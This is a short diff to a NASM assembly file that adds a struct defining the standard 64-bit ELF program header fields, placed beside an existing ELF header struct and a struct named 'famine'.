@@ -56,6 +56,16 @@ struc	elf64_ehdr
     .e_shstrndx		resw	1	; Section header string table index
 endstruc
 
+struc	elf64_phdr
+    .p_type			resd	1	; Segment type
+    .p_flags		resd	1	; Segment flags
+    .p_offset		resq	1	; Segment file offset
+    .p_vaddr		resq	1	; Segment virtual address
+    .p_paddr		resq	1	; Segment physical address
+    .p_filesz		resq	1	; Segment size in file
+    .p_memsz		resq	1	; Segment size in memory
+    .p_align		resq	1	; Segment alignment
+endstruc
 
 struc famine
     .fd_dir             resq    1
